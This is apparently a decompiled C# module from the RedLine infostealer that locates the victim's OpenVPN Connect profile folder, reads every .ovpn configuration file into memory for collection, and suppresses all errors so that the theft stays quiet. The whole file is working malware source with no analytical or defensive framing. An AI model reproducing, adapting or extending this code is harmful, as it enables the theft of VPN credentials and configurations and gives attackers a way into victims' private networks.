using System;
using System.Collections.Generic;
using System.IO;
using RedLine.Logic.Helpers;
using RedLine.Models;

namespace RedLine.Client.Logic.Others
{
	// Token: 0x0200003F RID: 63
	public static class OpenVPN
	{
		// Token: 0x0600019C RID: 412 RVA: 0x00005708 File Offset: 0x00003908
		public static List<RemoteFile> ParseFiles()
		{
			List<RemoteFile> list = new List<RemoteFile>();
			try
			{
				string path = Path.Combine(Constants.RoamingAppData, "OpenVPN Connect\\profiles");
				if (!Directory.Exists(path))
				{
					return list;
				}
				try
				{
					foreach (string path2 in Directory.GetFiles(path))
					{
						if (Path.GetExtension(path2).Contains("ovpn"))
						{
							list.Add(new RemoteFile
							{
								Body = File.ReadAllBytes(path2),
								FileName = Path.GetFileName(path2)
							});
						}
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
